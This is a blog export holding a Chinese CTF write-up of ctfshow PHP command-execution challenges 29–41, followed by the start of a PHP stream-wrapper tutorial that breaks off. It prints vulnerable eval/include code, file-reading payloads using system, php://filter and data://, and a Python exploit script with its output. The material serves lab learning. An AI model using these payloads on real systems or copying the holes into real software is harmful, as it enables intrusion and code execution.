<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow刷题_web入门命令执行篇</title>
      <link href="/post/e40cde58.html"/>
      <url>/post/e40cde58.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用GET传参数<code>c</code>, 如果使用<code>preg_match</code>在<code>c</code>中没有匹配到<code>flag</code>字符串, 那么<code>c</code>就能被执行</p><p>先传一个<code>phpinfo()</code>, 可以正常执行</p><img src="/images/ctf-web06/image-20220924155413736.png" alt="image-20220924155413736" style="zoom:67%;" /><p><strong><code>php</code>中, 可以使用<code>system(&quot;要执行的系统命令&quot;)</code>来执行系统命令</strong></p><p>例如这里传一个:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>成功读取了当前目录下的内容, 发现有个<code>flag.php</code></p><img src="/images/ctf-web06/image-20220924155523457.png" alt="image-20220924155523457" style="zoom:67%;" /><p>但flag会被过滤掉，遂尝试使用通配符*来绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat f*.php&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/images/ctf-web06/image-20220924155651400.png" alt="image-20220924155651400" style="zoom:67%;" /><p>然而什么都没显示.. 那么尝试将结果输出到文件中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat f*.php&gt;&gt;3.txt&quot;)</span><br></pre></td></tr></table></figure><p>执行后再访问<code>3.txt</code>, 就能够看到flag了</p><img src="/images/ctf-web06/image-20220924155815662.png" alt="image-20220924155815662" style="zoom:67%;" /><br><hr><br><h1 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次把<code>system命令也过滤了</code></p><p><strong>在GET中用 <code>eval</code>执行POST中的变量, 然后在POST中执行命令</strong></p><img src="/images/ctf-web06/image-20220924161454556.png" alt="image-20220924161454556" style="zoom:67%;" /><p>查看1.txt就找到flag了</p><p><img src="/images/ctf-web06/image-20220924161522232.png" alt="image-20220924161522232"></p><br><hr><br><h1 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和30类似, 只不过多过滤了不少关键词, 30的方法已经可以使用</p><p>这里尝试一下使用<code>passthru</code>命令来执行系统命令</p><img src="/images/ctf-web06/image-20220924162452963.png" alt="image-20220924162452963" style="zoom:67%;" /><br><hr><br><h1 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次连分号和括号都过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><img src="/images/ctf-web06/image-20220924162859817.png" alt="image-20220924162859817" style="zoom:67%;" /><p>首先因为c的内容会在后边的代码中被执行, 那么使用<code>include</code> 将变量<code>GET[a]</code>包含进去,这里后边本应有个分号,但分号被过滤了,所以使用<code>?&gt;</code>相当于<strong>提前对php代码进行闭合</strong></p><p><strong><code>&amp;</code>在url中的作用是分割不同的GET变量</strong></p><p>上面的代码只会对变量c的值进行过滤,而不会检查这里包含进去的变量a的值, 所以在a中使用<code>php伪协议</code>来将<code>flag.php</code>的代码用<code>base64</code>编码的形式输出, 再将其解码就能看到flag了</p><br><hr><br><h1 id="Web33-36"><a href="#Web33-36" class="headerlink" title="Web33-36"></a>Web33-36</h1><p>接下来四道题都是在32的基础上继续增加过滤的关键词,但都能够使用32题的方法解决~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h1><img src="/images/ctf-web06/image-20220924163101782.png" alt="image-20220924163101782" style="zoom:67%;" /><p>这次没有 <code>eval</code>了, 因此c的内容不能再被当作代码执行了</p><p>而c被<code>include</code>函数包含了，因此考虑通过c来执行<code>php伪协议</code>命令</p><p>使用<code>data://</code>协议可以执行php代码</p><ul><li><p><code>data://text/plain,&lt;?php 被执行的代码;</code></p></li><li><p><code>data://text/plain;base64, 被执行代码的base64编码</code>（包含<?php和?>）</p></li></ul><img src="/images/ctf-web06/image-20220924163532005.png" alt="image-20220924163532005" style="zoom:67%;" /><br><hr><br><h1 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h1><img src="/images/ctf-web06/image-20220924163606046.png" alt="image-20220924163606046" style="zoom:67%;" /><p>过滤了关键词php, 因此在上一题的基础上, 使用base64对要执行的php代码进行编码就可以绕过过滤了</p><img src="/images/ctf-web06/image-20220924163707058.png" alt="image-20220924163707058" style="zoom:67%;" /><p>上图中的编码解码后为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行完这一句,在执行编码后的这一句即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat f*.php&gt;&gt;1.txt&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h1><img src="/images/ctf-web06/image-20220924164006560.png" alt="image-20220924164006560" style="zoom:67%;" /><p>在37题的基础上, <code>include</code>中, 变量c后面加了<code>.php</code>后缀</p><p>那么这里可以在<code>data://</code>伪协议中要执行的<code>php</code>代码后面加上<code>?&gt;</code>闭合它, 由此,payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:text/plain,&lt;?php system(&#x27;cat f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>这里就相当于执行了<code>&lt;?php system(&#39;cat f*&#39;)?&gt;.php</code> 因为语句已经提前闭合了, 所以后面的<code>.php</code>后缀并没有什么用</p><br><hr><br><h1 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h1><p><img src="/images/ctf-web06/image-20220924170359956.png" alt="image-20220924170359956"></p><p>过滤了很多符号, php伪协议应该是用不了了</p><p>上边过滤的是中文括号，所以英文括号应该是可以用的</p><blockquote><p>这里使用无参数的<code>RCE(remote command/code execute)</code></p><p>也就是可以执行<code>a()、a(b())或a(b(c()))</code>，但不能是<code>a(&#39;b&#39;)</code>或<code>a(&#39;b&#39;,&#39;c&#39;)</code>，不能带参数,因为引号被过滤了</p></blockquote><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE</a></p><p>那么本题需要使用无参数, 且能够返回一定的字符的函数来构造最终的payload</p><ul><li><p><code>Localeconv()</code>返回一包含本地数字及货币格式信息的<strong>数组</strong>，其中第一个元素是<code> .</code></p></li><li><p><code>current()</code>返回数组中的单元，默认是第一个，<code>pos()</code>与<code>current()</code>作用相同</p><p>那么, <code>current(localeconv())</code>返回的就是<code>.</code></p></li><li><p><code>scandir()</code>扫描一个目录,将目录里的文件以数组的形式返回</p><p>那么<code> scandir(current(localeconv()))</code>就相当于 <code>scandir(.)</code>作用为扫描当前目录</p></li><li><p><code>print_r</code>打印</p></li></ul><p>​<code>Print_r(scandir(current(localeconv())))</code>作用就是打印当前目录下的内容</p><ul><li><code>getcwd()</code>获取当前的绝对路径</li></ul><p>  那么<code>Print_r(scandir(getcwd()))</code>就是扫描当前目录并输出结果</p><ul><li><p><code> show_source()</code>显示源码</p></li><li><p>数组操作:</p><ul><li><code>each()</code>返回当前键、值，并将指针向后移动一步</li><li><code>end()</code>指针指向最后一个单元</li><li><code>next()</code>指针后移一步</li><li><code>prev()</code>指针前移一步</li><li><code>array_reverse()</code>用相反的元素顺序返回数组</li></ul></li></ul><p>先查看当前目录下都有哪些文件:</p><img src="/images/ctf-web06/image-20220924171411445.png" alt="image-20220924171411445" style="zoom:67%;" /><p>逆序输出文件名数组:</p><img src="/images/ctf-web06/image-20220924171750132.png" alt="image-20220924171750132" style="zoom:67%;" /><p>将数组指针指向下一个元素, 也就是<code>flag.php</code>使用 <code>showsource()</code>输出它的源码</p><p><img src="/images/ctf-web06/image-20220924171800583.png" alt="image-20220924171800583"></p><br><hr><br><h1 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h1><p><img src="/images/ctf-web06/image-20220924172602630.png" alt="image-20220924172602630"></p><p>这题连字母都过滤了</p><p>通过脚本来完成, 首先通过一个php脚本生成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$my_file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;  <span class="comment"># 把题目里的过滤条件放在这里</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment"># 检查上面生成的十六进制数在转二进制后(hex2bin)能否被题目中给的过滤条件匹配到</span></span><br><span class="line">    &#125; </span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>; <span class="comment"># 如果没有被匹配到, 则在它们前面加上%,处理成url编码的格式</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)); </span><br><span class="line">            <span class="comment"># a和b url解码后在二进制下进行或运算,得到的结果是c这个字符</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$my_file</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$my_file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码生成一个这样的文件:  后面两个url编码后的字符(这些字符不会被题目中的过滤条件过滤)在经过或运算之后能够得到前面的字符,</p><p>那么接下来就可以通过两个字符进行或运算的方式来构造最终希望执行的命令代码</p><img src="/images/ctf-web06/image-20220925203512064.png" alt="image-20220925203512064" style="zoom:67%;" /><p>构造命令并发送通过python脚本来完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># os.system(&quot;php rce_or.php&quot;)  # 没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(argv) != <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg: <span class="comment"># 这里的arg就是我们需要执行的命令,及这个命令的参数, 例如show_source(flag.php)</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i: <span class="comment"># 对于arg中的每个字符, 取出能够通过运算得到它的两个编码</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span> </span><br><span class="line">    <span class="comment"># 得到的结果是第一个编码组成的串和第二个编码组成的串的或运算结果, 注意中间那个&quot;|&quot;是进行或运算的意思</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param) <span class="comment"># 解码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(param+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>程序运行结果如下图, 可以看到flag已经在响应包里了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">D:\python learning\ctf&gt;py web41.py http://080c3454-e571-44f6-80db-b2aac9c9e04e.challenge.ctf.show/</span><br><span class="line"></span><br><span class="line">[+] your function：show_source</span><br><span class="line">[+] your command：flag.php</span><br><span class="line"></span><br><span class="line">下面这两行是 param的内容, 对应位置的字符进行或运算可以分别得到 show_source 和 flag.php</span><br><span class="line">(&quot;%13%08%0f%17%00%13%0f%15%12%03%05&quot;|&quot;%60%60%60%60%5f%60%60%60%60%60%60&quot;)  (&quot;%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%60%2e%60%60%60&quot;)</span><br><span class="line">下面是最后准备POST的参数c的内容</span><br><span class="line">&#123;&#x27;c&#x27;: &#x27;(&quot;\x13\x08\x0f\x17\x00\x13\x0f\x15\x12\x03\x05&quot;|&quot;````_``````&quot;)(&quot;\x06\x0c\x01\x07\x00\x10\x08\x10&quot;|&quot;````.```&quot;)&#x27;&#125;</span><br><span class="line"></span><br><span class="line">[*] result:</span><br><span class="line">&lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$flag&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&lt;br /&gt;&lt;/span&gt;8161-85c6-4f0d-86b7-d83330fadd27&#125;&quot;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;1</span><br></pre></td></tr></table></figure><p>在上述python脚本中,<code> param</code>中字符原本为url编码的格式,也就是<code>%xx</code>格式, 它们解码后的字符都不在题目的过滤范围之内</p><p>35行需要对这些字符进行解码是因为它们在发送时还会被url编码, 这里的解码和后面发送时的自动编码是成对的. 抓包也能证明这一点</p><img src="/images/ctf-web06/image-20220925210440486.png" alt="image-20220925210440486" style="zoom:67%;" /><p>所以当这个包到达目标服务器时,按照正常流程还应该进行url解码, 所以题目给的脚本检测的实际上正是<code>param</code>的形式,因此也就绕过了过滤. </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议</title>
      <link href="/post/e3611a41.html"/>
      <url>/post/e3611a41.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1_概述"></a>1_概述</h1><p>PHP 带有很多内置 <strong>URL 风格的封装协议</strong>，可用于类似<code> fopen()</code>、<code> copy()</code>、<code> file_exists()</code> 和<code> filesize()</code>的文件系统函数。 除了这些封装协议，还能通过 <code>stream_wrapper_register()</code>来注册自定义的封装协议。</p><p>支持的协议:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="2-file-x2F-x2F-协议"><a href="#2-file-x2F-x2F-协议" class="headerlink" title="2_file:&#x2F;&#x2F;协议"></a>2_file:&#x2F;&#x2F;协议</h1><p>用于<strong>访问本地文件系统</strong>，在CTF中通常用来<strong>读取本地文件</strong><br>在<code> include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照<code>php</code>语法进行解析，这是<code>include()</code>函数所决定的。</p><p>此协议能否使用不受<code>PHP.ini</code>(php配置文件)中 <code>allow_url_fopen</code>和<code>allow_url_include</code>两个字段的值的影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on/off</span><br><span class="line">allow_url_include=on/Off</span><br></pre></td></tr></table></figure><p><code>file://</code>文件系统是php使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径时, 将基于当前的工作目录。</p><p>使用实例:</p><p>假设<code>include.php</code>的代码为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    include $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么通过<code>GET</code>中的<code>file</code>变量:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 